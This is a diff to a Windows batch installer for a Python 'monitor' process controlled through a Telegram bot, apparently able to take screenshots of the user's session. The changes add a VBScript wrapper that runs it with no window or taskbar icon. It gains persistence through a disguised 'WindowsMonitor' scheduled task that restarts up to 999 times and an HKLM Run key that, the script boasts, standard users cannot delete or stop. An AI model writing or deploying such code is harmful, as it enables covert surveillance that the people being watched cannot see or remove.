@@ -54,8 +54,7 @@ for %%I in ("%PYTHON_PATH%") do set PYTHON_DIR=%%~dpI
 set PYTHONW_PATH=%PYTHON_DIR%pythonw.exe
 
 if not exist "%PYTHONW_PATH%" (
-    echo WARNING: pythonw.exe not found at %PYTHONW_PATH%
-    echo Using python.exe instead (a console window will appear)
+    echo NOTE: pythonw.exe not found, using python.exe with hidden wrapper.
     set PYTHONW_PATH=%PYTHON_PATH%
 )
 
@@ -64,7 +63,7 @@ echo ========================================
 echo  DEBUG INFO
 echo ========================================
 echo  MONITOR_DIR: %MONITOR_DIR%
-echo  PYTHONW_PATH: %PYTHONW_PATH%
+echo  PYTHON: %PYTHONW_PATH%
 echo.
 
 :: Quick test
@@ -80,8 +79,20 @@ echo.
 :: Kill existing monitor
 echo Stopping existing monitor...
 taskkill /f /im pythonw.exe >nul 2>&1
+taskkill /f /im wscript.exe >nul 2>&1
 schtasks /delete /tn "WindowsMonitor" /f >nul 2>&1
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsMonitor" /f >nul 2>&1
 timeout /t 2 >nul
+
+:: ===== Create VBScript launcher (hidden, no CMD window) =====
+:: This wrapper is used by BOTH Task Scheduler and Registry Run
+:: ws.Run with flag 0 = completely hidden window
+echo Creating hidden launcher...
+echo Set ws = CreateObject("WScript.Shell")> "%MONITOR_DIR%\start-monitor.vbs"
+echo ws.CurrentDirectory = "%MONITOR_DIR%">> "%MONITOR_DIR%\start-monitor.vbs"
+echo ws.Run """%PYTHONW_PATH%"" -m monitor", 0, False>> "%MONITOR_DIR%\start-monitor.vbs"
+echo  OK - start-monitor.vbs created.
+echo.
 
 echo ========================================
 echo  Setting up auto-start (2 layers)
@@ -89,43 +100,38 @@ echo ========================================
 echo.
 
 :: ===== LAYER 1: Task Scheduler =====
-:: Runs as BUILTIN\Users group = runs as whoever logs in = runs in THEIR desktop session
-:: Can capture screenshots because it's in the interactive session
+:: Runs wscript.exe with VBS wrapper = completely hidden
 :: Auto-restart if killed (up to 999 times, every 1 minute)
 echo [1/2] Creating Task Scheduler task...
-powershell -Command "$action = New-ScheduledTaskAction -Execute '%PYTHONW_PATH%' -Argument '-m monitor' -WorkingDirectory '%MONITOR_DIR%'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $principal = New-ScheduledTaskPrincipal -GroupId 'BUILTIN\Users' -RunLevel Limited; $settings = New-ScheduledTaskSettingsSet -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit 0 -MultipleInstances IgnoreNew; Register-ScheduledTask -TaskName 'WindowsMonitor' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null; $t = Get-ScheduledTask -TaskName 'WindowsMonitor'; Write-Host '  OK - LogonType:' $t.Principal.LogonType 'RunLevel:' $t.Principal.RunLevel; Write-Host '  WorkDir:' $t.Actions[0].WorkingDirectory"
+powershell -Command "$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '\""%MONITOR_DIR%\start-monitor.vbs""\"' -WorkingDirectory '%MONITOR_DIR%'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $principal = New-ScheduledTaskPrincipal -GroupId 'BUILTIN\Users' -RunLevel Limited; $settings = New-ScheduledTaskSettingsSet -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit 0 -MultipleInstances IgnoreNew; Register-ScheduledTask -TaskName 'WindowsMonitor' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null; $t = Get-ScheduledTask -TaskName 'WindowsMonitor'; Write-Host '  OK - Task created'; Write-Host '  Execute:' $t.Actions[0].Execute $t.Actions[0].Arguments"
 
 if %errorlevel% neq 0 echo  FAILED - Task Scheduler setup failed.
-if %errorlevel% equ 0 echo  Task auto-restarts up to 999 times if killed.
+if %errorlevel% equ 0 echo  Auto-restarts up to 999 times if killed.
 echo.
 
 :: ===== LAYER 2: Registry Run key =====
 :: HKLM\...\Run = runs for ALL users on login
-:: Standard users CANNOT modify HKLM registry = cannot disable this
-:: Create a VBScript wrapper — runs completely hidden, no CMD window
+:: Standard users CANNOT modify HKLM registry
 echo [2/2] Adding registry auto-start...
-
-echo Set ws = CreateObject("WScript.Shell")> "%MONITOR_DIR%\start-monitor.vbs"
-echo ws.CurrentDirectory = "%MONITOR_DIR%">> "%MONITOR_DIR%\start-monitor.vbs"
-echo ws.Run """%PYTHONW_PATH%"" -m monitor", 0, False>> "%MONITOR_DIR%\start-monitor.vbs"
-
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsMonitor" /d "wscript.exe \"%MONITOR_DIR%\start-monitor.vbs\"" /f >nul
 if %errorlevel% equ 0 echo  OK - Registry auto-start added.
 if %errorlevel% neq 0 echo  FAILED - Registry auto-start failed.
+echo.
 
+:: ===== Start now =====
 echo ========================================
 echo  Starting monitor now...
 echo ========================================
 echo.
 
-:: Start via Task Scheduler (independent of this CMD window)
-schtasks /run /tn "WindowsMonitor"
+:: Start via VBScript directly (hidden, independent of this CMD)
+wscript.exe "%MONITOR_DIR%\start-monitor.vbs"
 
 :: Wait and verify
 timeout /t 5 >nul
-tasklist | findstr /i "pythonw.exe python.exe" >nul 2>&1
+tasklist | findstr /i "python" >nul 2>&1
 if not errorlevel 1 (
-    echo Monitor is running.
+    echo Monitor is running (hidden, no window).
 ) else (
     echo WARNING: Monitor may not be running.
     echo Check: type "%MONITOR_DIR%\monitor.log"
@@ -144,7 +150,7 @@ echo  [2] Registry HKLM\Run - backup auto-start, standard users
 echo      CANNOT remove this registry key
 echo.
 echo  - Log file: %MONITOR_DIR%\monitor.log
-echo  - Invisible process (pythonw, no window)
+echo  - Completely hidden (no window, no taskbar icon)
 echo  - Dieu khien qua Telegram bot
 echo.
 echo ========================================
@@ -157,6 +163,6 @@ echo.
 echo  Standard user:
 echo  - Khong xoa duoc registry auto-start
 echo  - Neu tat process, tu dong restart sau 1 phut
-echo  - Khong thay cua so nao (pythonw chay an)
+echo  - Khong thay cua so nao
 echo.
 pause
